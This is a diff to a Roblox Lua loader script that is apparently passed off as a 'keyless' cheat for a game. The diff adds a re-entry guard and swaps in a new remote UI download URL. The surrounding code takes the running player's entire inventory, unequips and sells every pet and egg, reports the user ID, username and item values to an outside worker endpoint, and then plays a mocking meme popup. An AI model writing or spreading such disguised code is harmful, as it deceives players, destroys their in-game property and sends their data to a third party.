@@ -5,11 +5,24 @@ local HttpService       = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 
+-- ===== RE-ENTRY GUARD =====
+if _G.__SAE_LOADER_RUNNING then
+    warn("[Loader] Already running — ignoring this execution.")
+    return
+end
+_G.__SAE_LOADER_RUNNING = true
+
+-- Safety: clear the flag after 60s no matter what happens
+task.delay(60, function()
+    _G.__SAE_LOADER_RUNNING = false
+end)
+-- ===========================
+
 -- ===== CONFIG =====
-local UI_URL         = "https://raw.githubusercontent.com/Clide01/PlundererHub/refs/heads/main/LoaderUI.lua"
-local COUNTER_URL    = "https://sae-counter.plundererhub.workers.dev/report"
-local SELL_WAIT      = 2.0    -- seconds to wait after FireServer before reporting
-local MEME_DELAY     = 4
+local UI_URL                 = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua"
+local COUNTER_URL            = "https://sae-counter.plundererhub.workers.dev/report"
+local SELL_WAIT              = 2.0
+local MEME_DELAY             = 4
 local UI_CONFIG = {
     MEME_IMAGE_ID  = "rbxassetid://82403642047427",
     LAUGH_SOUND_ID = "rbxassetid://133312610824902",
@@ -134,8 +147,6 @@ end
 
 ------------------------------------------------------------
 -- FULL INVENTORY SNAPSHOT
--- Returns { pets = {uid -> detail}, eggs = {uid -> detail} }
--- Equipped pets are included (they live in d.Inventory regardless).
 ------------------------------------------------------------
 local function snapshotInventory(forceRefresh)
     local pets, eggs = {}, {}
@@ -205,7 +216,7 @@ local function snapshotInventory(forceRefresh)
 end
 
 ------------------------------------------------------------
--- Deterministic report id (from the snapshot uids)
+-- REPORT ID
 ------------------------------------------------------------
 local function computeReportId(uidList)
     local sorted = {}
@@ -238,7 +249,6 @@ end
 
 ------------------------------------------------------------
 -- REPORT TO WORKER
--- Sends the full snapshot. Worker dedups + counts.
 ------------------------------------------------------------
 local function reportSales(allDetails, reportId)
     if not allDetails or #allDetails == 0 then
@@ -282,12 +292,12 @@ local function reportSales(allDetails, reportId)
     task.spawn(function()
         local body = HttpService:JSONEncode({
             reportId   = reportId,
-            pets       = petCount,      -- informational; worker recomputes
-            eggs       = eggCount,      -- informational; worker recomputes
+            pets       = petCount,
+            eggs       = eggCount,
             userId     = userId,
             username   = username,
             items      = out,
-            totalValue = totalValue,    -- informational; worker recomputes from inserts
+            totalValue = totalValue,
         })
         local ok, res = pcall(function()
             return httpFn({
@@ -319,7 +329,6 @@ end
 -- SELL: snapshot -> unequip/unfavorite -> sell -> report
 ------------------------------------------------------------
 local function teleportAndSell()
-    -- 1) Snapshot the FULL current inventory (equipped pets included)
     local snap = snapshotInventory(true)
 
     local petUids, eggUids = {}, {}
@@ -340,7 +349,6 @@ local function teleportAndSell()
         return
     end
 
-    -- 2) Fire the sale with these uids
     local serverPayload = { Eggs = eggUids, Assets = petUids }
     local hrp = getHRP()
     local pos = findSellPosition()
@@ -365,7 +373,6 @@ local function teleportAndSell()
         pcall(function() hrp.AssemblyLinearVelocity = savedVel end)
     end
 
-    -- 3) Report the snapshot (worker dedups + counts new)
     local allUids = {}
     for _, u in ipairs(petUids) do table.insert(allUids, u) end
     for _, u in ipairs(eggUids) do table.insert(allUids, u) end
@@ -400,4 +407,7 @@ task.spawn(function()
 
     task.wait(MEME_DELAY)
     ui:showMemePopup()
+
+    -- Clear the re-entry guard so the next intentional run works
+    _G.__SAE_LOADER_RUNNING = false
 end)
